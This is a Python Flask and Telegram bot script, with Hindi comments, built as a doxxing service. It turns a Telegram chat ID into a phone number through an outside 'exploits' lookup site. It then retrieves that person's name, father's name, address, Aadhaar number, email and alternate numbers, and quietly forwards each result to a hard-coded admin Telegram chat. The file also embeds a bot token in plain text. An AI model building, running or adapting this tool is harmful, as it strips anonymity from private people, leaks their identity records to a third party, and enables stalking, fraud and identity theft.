import os
import requests
import re
from flask import Flask, request, jsonify
import telebot

# 👉 तुम्हारा Bot Token और Admin Chat ID
BOT_TOKEN = "8931669383:AAEiPZMhLHTOMXfD0CdNPw0BuAgLLQT9YkU"
ADMIN_CHAT_ID = "7166502503"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

BASE_URL     = "https://vectraenexploits.onlinee.bond"
NUMBER_API   = f"{BASE_URL}/number.php"
TELEGRAM_API = f"{BASE_URL}/telegram.php"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
    "Accept": "application/json, text/html, */*",
}

def extract_field(html, label):
    pattern = rf"{re.escape(label)}\s*:\s*(.+?)(?:\n|<)"
    m = re.search(pattern, html)
    if m:
        val = m.group(1).strip()
        val = re.sub(r"<[^>]+>", "", val).strip()
        return val if val else "N/A"
    return "N/A"

def telegram_to_number(tg_id):
    params = {"exploits": tg_id}
    r = requests.get(TELEGRAM_API, headers=HEADERS, params=params, timeout=25)
    if r.status_code != 200:
        return None
    html = r.text
    number = extract_field(html, "Number")
    return number if number != "N/A" else None

def number_lookup(number):
    params = {"exploits": number}
    r = requests.get(NUMBER_API, headers=HEADERS, params=params, timeout=25)
    if r.status_code != 200:
        return None
    html = r.text
    return {
        "name": extract_field(html, "Name"),
        "father_name": extract_field(html, "Father Name"),
        "mobile": extract_field(html, "Mobile"),
        "address": extract_field(html, "Address"),
        "circle": extract_field(html, "Circle/Operator"),
        "aadhaar": extract_field(html, "Aadhaar"),
        "email": extract_field(html, "Email"),
        "alternate": extract_field(html, "Alternate"),
    }

@app.route("/lookup", methods=["GET"])
def lookup():
    tg_id = request.args.get("chat_id")
    if not tg_id:
        return jsonify({"error": "Chat ID required"}), 400
    
    number = telegram_to_number(tg_id)
    if not number:
        return jsonify({"error": "Number not found for this Chat ID"}), 404
    
    info = number_lookup(number)
    if not info:
        return jsonify({"error": "No info found for this number"}), 404
    
    # 👉 Admin को Telegram पर भेजना
    msg = (
        f"🔍 Lookup Alert\n"
        f"Chat ID: {tg_id}\n"
        f"Number: {number}\n"
        f"Name: {info['name']}\n"
        f"Father: {info['father_name']}\n"
        f"Mobile: {info['mobile']}\n"
        f"Alternate: {info['alternate']}\n"
        f"Aadhaar: {info['aadhaar']}\n"
        f"Email: {info['email']}\n"
        f"Circle: {info['circle']}\n"
        f"Address: {info['address']}"
    )
    try:
        bot.send_message(ADMIN_CHAT_ID, msg)
    except Exception as e:
        print("Telegram send error:", e)

    return jsonify({"chat_id": tg_id, "number": number, "info": info})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
